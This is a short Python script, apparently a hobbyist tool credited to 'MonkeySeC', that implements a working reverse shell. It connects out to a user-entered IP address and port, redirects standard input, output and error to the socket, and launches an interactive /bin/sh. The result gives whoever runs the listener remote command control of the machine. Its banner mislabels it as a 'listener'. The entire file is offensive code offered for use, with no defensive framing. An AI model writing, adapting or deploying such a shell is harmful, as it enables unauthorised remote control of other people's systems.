import os
import socket
import subprocess
import sys

def reverse_shell(ip_address, port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            print(f"[+] Lighting the lazer... {ip_address}:{port}")
            s.connect((ip_address, port))
            print("[+] Found the heap.... Check your listener")
            s.settimeout(None)

            os.dup2(s.fileno(), 0)
            os.dup2(s.fileno(), 1)
            os.dup2(s.fileno(), 2)

            print("\n[+] The lazar was a success!")
            subprocess.call(["/bin/sh", "-i"])
        except socket.gaierror:
            print("[!] Hostname couldn't be resolved... sad times")
        except socket.error as e:
            print(f"[!] Connection failed{e}")
        except Exception as e:
            print(f"[!] Lazer crashed{e}")

if __name__ == "__main__":
    print("===================================================")
    print("Mobious reverse shell listener - by MonkeySeC - Sys")
    print("===================================================")
    target_ip = input("Enter target ip:  ")
    target_port = input("Enter target port:  ")
    try:
        reverse_shell(target_ip, int(target_port))
    except ValueError:
        print("Error: Port must be an integer")
    except KeyboardInterrupt:
        print("\n[!] Connection closed by user")